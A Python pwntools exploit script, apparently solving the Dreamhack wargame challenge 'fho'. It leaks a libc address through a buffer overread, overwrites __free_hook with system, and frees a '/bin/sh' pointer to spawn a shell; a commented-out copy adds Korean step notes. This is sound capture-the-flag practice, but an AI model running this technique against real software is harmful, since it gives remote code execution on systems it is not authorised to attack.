from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

def start():
    if args.REMOTE:
        host='host3.dreamhack.games'
        port=17639
        return remote(host,port)
    else:
        return process("./fho")
p=start()

# free_hook = 0x3ed8e8   
# system = 0x4f550        
# binsh = 0x1b3e1a 
#libc_base 구하기 위한 elf 파싱
e = ELF("./fho")
libc = ELF("./libc-2.27.so")

#libc 유출
payload = b'a'*0x48 #rbp까지 rip유출
p.sendafter('Buf: ',payload)
p.recvuntil(payload)

#return address(__libc_start_call_main+offset+122) 유출
libc_start_main=u64(p.recvline()[:-1]+b'\x00'*2)#유출된 값을 개행문자를 지우고 뒤에 0x00 바이트 복원하고 정수로 본다

#유출된값은 offset+바이너리 주소
libc_base = libc_start_main-(libc.symbols['__libc_start_main']+231)
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())

p.recvuntil('With: ')
p.sendline(str(system).encode())

p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()

# from pwn import *

# p = remote("host3.dreamhack.games", 17639)
# e = ELF('./fho')
# libc = ELF('./libc-2.27.so')

# # [1] libc base
# buf = b'A'*0x48

# p.sendafter('Buf: ', buf)
# p.recvuntil(buf)

# libc_start_main = u64(p.recvline()[:-1] + b'\x00'*2)	# 마지막 개행 문자 자르고 잘린 널바이트 붙여주기
# libc_base = libc_start_main - (libc.symbols['__libc_start_main'] + 231)
# # libc.symbols 말고 libc.libc_start_main_return도 가능
# system = libc_base + libc.symbols['system']
# free_hook = libc_base + libc.symbols['__free_hook']
# binsh = libc_base + next(libc.search(b'/bin/sh'))

# # [2] free_hook 함수를 system 함수로 덮기
# p.recvuntil('To write: ')
# p.sendline(str(free_hook).encode())		# 숫자를 문자열로(str), 문자열을 바이트로(.encode())
# p.recvuntil('With: ')
# p.sendline(str(system).encode())

# # [3] free 함수 실행
# p.recvuntil('To free: ')
# p.sendline(str(binsh).encode())

# p.interactive()